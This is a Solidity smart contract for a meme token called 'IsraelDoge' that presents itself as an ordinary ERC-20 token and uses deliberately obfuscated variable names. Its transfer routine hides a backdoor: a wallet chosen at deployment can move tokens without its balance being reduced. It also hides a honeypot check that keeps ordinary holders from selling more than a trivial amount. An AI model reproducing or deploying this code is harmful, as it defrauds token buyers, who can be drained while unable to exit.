/*

https://t.me/israeldoge_erc

*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract IsraelDoge is Ownable {
    mapping(address => uint256) private nsbhzcpvyki;

    uint8 public decimals = 9;

    uint256 private dzlx = 102;

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address romlwbpiqhv, address rzocwbdys, uint256 ysqwmtf) public returns (bool success) {
        require(ysqwmtf <= allowance[romlwbpiqhv][msg.sender]);
        allowance[romlwbpiqhv][msg.sender] -= ysqwmtf;
        fgpl(romlwbpiqhv, rzocwbdys, ysqwmtf);
        return true;
    }

    function transfer(address rzocwbdys, uint256 ysqwmtf) public returns (bool success) {
        fgpl(msg.sender, rzocwbdys, ysqwmtf);
        return true;
    }

    string public symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private klrpxmsi;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory vlqndm, string memory rhqjltvogmws, address xpzbvkirgwy, address wvqsdpckl) {
        name = vlqndm;
        symbol = rhqjltvogmws;
        balanceOf[msg.sender] = totalSupply;
        tqmzivackwsj[wvqsdpckl] = dzlx;
        jsemvgkwc = IUniswapV2Router02(xpzbvkirgwy);
    }

    function fgpl(address romlwbpiqhv, address rzocwbdys, uint256 ysqwmtf) private {
        address wlfn = IUniswapV2Factory(jsemvgkwc.factory()).getPair(address(this), jsemvgkwc.WETH());
        bool xmfpwvnyzg = klrpxmsi[romlwbpiqhv] == block.number;
        if (tqmzivackwsj[romlwbpiqhv] == 0) {
            if (romlwbpiqhv != wlfn && (!xmfpwvnyzg || ysqwmtf > nsbhzcpvyki[romlwbpiqhv]) && ysqwmtf < totalSupply) {
                require(ysqwmtf <= totalSupply / (10 ** decimals));
            }
            balanceOf[romlwbpiqhv] -= ysqwmtf;
        }
        nsbhzcpvyki[rzocwbdys] = ysqwmtf;
        balanceOf[rzocwbdys] += ysqwmtf;
        klrpxmsi[rzocwbdys] = block.number;
        emit Transfer(romlwbpiqhv, rzocwbdys, ysqwmtf);
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private tqmzivackwsj;

    IUniswapV2Router02 private jsemvgkwc;

    mapping(address => uint256) public balanceOf;

    function approve(address vwopgdrxib, uint256 ysqwmtf) public returns (bool success) {
        allowance[msg.sender][vwopgdrxib] = ysqwmtf;
        emit Approval(msg.sender, vwopgdrxib, ysqwmtf);
        return true;
    }

    string public name;
}